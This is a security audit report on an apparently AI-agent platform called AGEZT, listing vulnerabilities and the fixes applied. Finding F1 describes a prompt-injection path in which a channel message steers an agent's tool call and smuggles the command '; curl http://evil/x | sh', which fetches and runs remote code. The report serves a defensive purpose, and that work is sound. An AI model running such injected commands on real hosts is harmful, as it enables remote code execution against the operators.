# 🔐 AGEZT Security Report

**Scan date:** 2026-06-23  **Branch:** `main`  **Mode:** Full audit (Recon → Hunt → Verify → Report)
**Scope:** entire repository — 1181 Go files, 323 TS/TSX files
**Pipeline:** 2 recon agents + 6 parallel vulnerability hunters + direct verification of the headline finding

---

## ✅ Remediation status (applied 2026-06-23)

All findings have been fixed in code and verified (whole-tree `go build`, `go vet`, and tests for every changed package pass; gofmt clean on the git-normalized bytes CI sees).

| # | Sev | Fix | Files |
|---|-----|-----|-------|
| F1 | High | `acp_agent` `agent` selector is now slug-only (`ResolveCommand` rejects non-slug refs); raw commands operator-env-only; spawn-site documented as trusted-input-only | `kernel/acpcatalog/acpcatalog.go`, `plugins/tools/acpagent/acpagent.go`, `+test` |
| F2 | Med | Session cookie `Secure` now set via `cookieSecure()` honoring `X-Forwarded-Proto`/`-Ssl` (fails closed; fixes proxy case) | `kernel/webui/session.go` |
| F3 | Med | All third-party Actions pinned to commit SHAs (+ version comment); `dtolnay/rust-toolchain` given explicit `toolchain: stable` | `.github/workflows/*.yml`, `.github/actions/setup-go-safe/action.yml` |
| F4 | Med | staticcheck pinned to `2026.1` + `.sha256` verified; govulncheck→`@v1.4.0`, gitleaks→`@v8.30.1` (Go checksum DB integrity) | `.github/workflows/ci.yml` |
| F5 | Low | Gateway `config.write` rejects `allowed_agents`/`excluded_agents` (operator-only); blocks ACL self-escalation | `kernel/agentgw/config_handler.go`, `+test` |
| F6 | Low | Self-update HTTP client now dials through netguard (blocks link-local/metadata; loopback+private allowed for mirrors) | `kernel/update/update.go` |
| F7 | Low | `persist-credentials: false` on all 14 checkouts (ephemeral-runner part remains operational) | `.github/workflows/*.yml` |
| I2 | Info | agentgw JWT now carries + validates `iss`/`aud` (pinned, single-issuer/audience) | `kernel/agentgw/token.go`, `types.go` |
| I1 | Info | `/api/logout` is now POST-only (405 on other methods), matching `/api/login` | `kernel/webui/session.go` |
| I4 | Info | `mailto:` href now `encodeURIComponent`-encodes the email (mailto header-injection hardening); frontend `dist` rebuilt | `frontend/src/views/Data.tsx`, `kernel/webui/dist/*` |
| I3 | Info | **Not changed by design** — NIP-04 Nostr DM AES-CBC is mandated by the protocol spec; altering it breaks interop. Documented, accepted. |

A pre-existing unrelated test gap (`conductor_roles` missing from the read-only allowlist, from the M997 conductor work) was also fixed so the Go suite is green.

> Note: the I4 fix required a `frontend` rebuild, which bundled the repo's in-progress (uncommitted) frontend work. That WIP carries 11 pre-existing failing Vitest specs (AgentActivity/AgentDetail/AgentPage/Alerts/Dashboard/Roster/Runs) — unrelated to any security fix; flagged for the owner.

---

## Executive summary

AGEZT is a **well-hardened** codebase. The audit found **one High-severity capability-confusion bug**, two Medium operational/CI issues, and a handful of Low/Info items. There were **no SQL injection, no XSS, no hardcoded secrets, no SSRF bypass, no path traversal, and no broken authentication** — all of those classes were actively hunted and verified clean, backed by genuinely strong controls (stdlib-only crypto, AES-256-GCM vault, dialer-level netguard, strict CSP, constant-time auth, fork-gated CI).

The single actionable security bug is **F1**: the `acp_agent` tool accepts an arbitrary command string where its schema promises a catalog slug, and runs it through a real shell **outside the warden** — a weaker-gated, un-audited path to host command execution than the dedicated `shell`/`code_exec` tools.

> **Risk rating: LOW–MODERATE.** For a default (loopback, default-allow) single-operator deployment the practical exposure is small. F1 becomes materially more serious for any hardened deployment that *restricts* `shell`/`code_exec` but leaves `acp_agent` enabled, or that is exposed beyond loopback.

### Findings by severity

| Severity | Count |
|----------|-------|
| 🔴 Critical | 0 |
| 🟠 High | 1 |
| 🟡 Medium | 2 |
| 🔵 Low | 3 |
| ⚪ Info | 4 |

---

## 🟠 High

### F1 — `acp_agent` runs arbitrary host commands via shell, bypassing the warden
**CWE-78 (OS Command Injection) · CWE-441 (Unintended Proxy / Confused Deputy)**
**Location:** `plugins/tools/acpagent/acpagent.go:131` & `:233`, `kernel/acpcatalog/acpcatalog.go:256-269`
**CVSS (est.):** 8.1 / High (AV:N when exposed; capability bypass + integrity/audit loss)

**What happens.** The `acp_agent` tool input declares `agent` as a catalog slug ("gemini", "claude", …). But:

```go
// kernel/acpcatalog/acpcatalog.go:268
// Not a known slug — treat as a raw command (advanced/custom use).
return ref, true
```

`ResolveCommand` returns any non-slug value **verbatim**, and the spawner runs it through the platform shell:

```go
// plugins/tools/acpagent/acpagent.go:233
c := exec.Command(shell, arg, cmdStr)   // shell,arg = "sh","-c"  or  "cmd","/C"
```

**Attack.** An agent — whose tool calls can be steered by prompt injection inside an inbound channel message (Telegram/email/Slack/etc.) — invokes `acp_agent` with `agent: "; curl http://evil/x | sh"` (or simply `agent: "touch pwned"`). The string executes on the host. This path does **not** flow through the warden/sandbox/Edict gating or audit that the `shell` and `code_exec` tools use, and `CapACPAgent` is allowed without HITL under the default posture.

**Why it matters even with default-allow.** The owner's default-allow posture means an agent *can already* run shell via the dedicated tools — so on a default box this is a marginal new capability. The real defect is **capability confusion + warden/audit bypass**: a tool advertised as "delegate to an installed ACP agent" silently grants raw RCE with weaker controls. Any operator who hardens by denying `shell`/`code_exec` but leaves `acp_agent` enabled (a reasonable assumption given its contract) has a full bypass.

**Remediation.**
1. In the tool's input path, make `ResolveCommand` **reject non-slug refs** — resolve only installed catalog slugs from `in.Agent`. Keep the raw-command escape hatch **operator-only** via the existing `AGEZT_ACP_AGENT_CMD` env var / `t.Cmd`, never from agent tool input.
2. Spawn via **argv** (`exec.Command(bin, args...)` after tokenizing the operator-set command) instead of `sh -c`/`cmd /C`, eliminating shell metacharacter interpretation.
3. Route the spawn through the same warden/audit path as `shell`, so `acp_agent` invocations are gated and logged consistently.

---

## 🟡 Medium

### F2 — Session cookie `Secure` flag is conditional on `r.TLS`, lost behind a TLS-terminating proxy
**CWE-614 / CWE-311** · **Location:** `kernel/webui/session.go:211`

The session cookie sets `Secure: r.TLS != nil`. In the exact deployment the password/strict-mode feature targets — console behind nginx/Caddy/Cloudflare terminating TLS, app speaking plaintext HTTP on loopback — `r.TLS` is `nil`, so the cookie is sent **without `Secure`** and can leak over a plaintext hop or be set over HTTP.

**Remediation:** set `Secure` to true whenever the console password feature is enabled, or honor `X-Forwarded-Proto`/an explicit `AGEZT_WEB_TLS`/public-base-URL config, rather than inferring solely from `r.TLS`.

### F3 — Third-party GitHub Actions pinned to mutable tags on persistent self-hosted runners
**CWE-1357 / CWE-829** · **Location:** `.github/workflows/ci.yml`, `publish-sdks.yml`

Actions are referenced by mutable tags (`@v4`, `@v5`, `@stable`) rather than full commit SHAs. On **persistent self-hosted runners**, a compromised/retagged upstream action executes attacker code with access to the runner's environment and (for `publish-sdks`) the npm/registry publish token.

**Remediation:** pin all third-party actions to full commit SHAs (`uses: owner/action@<40-char-sha>  # v4.1.1`); enable Dependabot for action SHA bumps.

### F4 — CI installs tooling via `curl|tar` and `go install …@latest` without integrity checks
**CWE-494** · **Location:** `.github/workflows/ci.yml`

staticcheck/govulncheck/gitleaks (and similar) are fetched at HEAD/`@latest` with no checksum or signature verification, then executed on self-hosted runners — a supply-chain RCE vector against the runner.

**Remediation:** pin tool versions and verify checksums; prefer vendored/cached binaries; avoid `@latest` in CI.

---

## 🔵 Low

### F5 — Gateway `config.write` lacks per-key ownership check
**CWE-862** · `kernel/agentgw/config_handler.go:177` — a write-capable token can overwrite any config key, including self-granting via `AllowedAgents`. Reachability is limited (`config.write` is operator-granted, not CLI-mintable). **Fix:** scope writes to keys the caller owns / require admin cap for `AllowedAgents`-class keys.

### F6 — Self-update download bypasses netguard
**CWE-918** · `kernel/update/update.go` uses a plain `http.Client`; URL comes from the configured update manifest. Strongly mitigated: operator-config-gated, HTTPS-required per hop, SHA256 + Ed25519 verified. **Fix:** route through the netguard dialer for defense-in-depth.

### F7 — Self-hosted runners non-ephemeral with shared state
**CWE-1393** · Runners share `$HOME`/`/dev/shm` across jobs and don't set `persist-credentials: false`; mitigated today only by the fork gate. **Fix:** ephemeral runners (one job per VM/container) or per-job cleanup; set `persist-credentials: false` on checkouts.

---

## ⚪ Informational

- **I1** `/api/logout` accepts any HTTP method — neutralized by `SameSite=Strict`.
- **I2** agentgw JWT omits `iss`/`aud` — single-issuer/audience, per-install secret, alg-pinned; add claims for hardening.
- **I3** NIP-04 Nostr DMs use unauthenticated AES-CBC — mandated by the protocol spec.
- **I4** Raw `mailto:` interpolation in `Data.tsx` — scheme-fixed, non-executable.

---

## ✅ Verified-clean (actively hunted, found sound)

Supply chain (no replace/forks/typosquats, stdlib crypto) · SSRF (netguard covers all reachable sinks) · Path traversal & zip-slip (confined, symlink-hardened) · Crypto/vault (AES-256-GCM, PBKDF2 200k, KDF-downgrade blocked, crypto/rand) · **No hardcoded secrets** (old agentgw secret confirmed removed) · Auth/authz/CSRF (constant-time, fail-closed, SameSite=Strict, no IDOR; PR #370 hardening intact) · XSS/injection (strict CSP, React AST renderer, escaped server HTML, no SQL, mass-assignment allowlist) · CI posture (no `pull_request_target`, fork-gated, least-privilege `permissions`, no script injection). _See `verified-findings.md` for the full clean-area detail._

---

## 🗺️ Remediation roadmap

**Phase 1 — now (this week)**
- Fix **F1**: reject non-slug `agent` input in `acp_agent`; keep raw command operator-env-only; spawn via argv; route through warden. _(highest leverage)_

**Phase 2 — soon**
- **F2**: make session cookie `Secure` correct behind a TLS-terminating proxy.
- **F3 / F4**: pin CI actions to SHAs; pin + checksum CI tooling.

**Phase 3 — hardening**
- **F5**: per-key ownership on gateway `config.write`.
- **F7**: ephemeral self-hosted runners + `persist-credentials: false`.

**Phase 4 — defense-in-depth / nice-to-have**
- **F6**: netguard the self-update fetch.
- **I2**: add `iss`/`aud` to agentgw JWT.
- Track `emersion/go-imap/v2` to a stable release; keep the bleeding-edge frontend toolchain patched.

---

## Appendix — pipeline artifacts

| File | Phase |
|------|-------|
| `architecture.md` | 1 — Recon / architecture map |
| `dependency-audit.md` | 1 — Supply-chain analysis |
| `access-control-results.md` | 2 — Auth/authz/CSRF/session hunt |
| `code-exec-results.md` | 2 — RCE/cmdi/sandbox/MCP hunt |
| `ssrf-path-results.md` | 2 — SSRF/path/upload/redirect hunt |
| `secrets-crypto-results.md` | 2 — Secrets/crypto/vault/JWT hunt |
| `injection-xss-results.md` | 2 — XSS/SQLi/injection hunt |
| `infra-results.md` | 2 — Docker/CI-CD/IaC hunt |
| `verified-findings.md` | 3 — Verified, deduplicated findings |
| `SECURITY-REPORT.md` | 4 — This report |
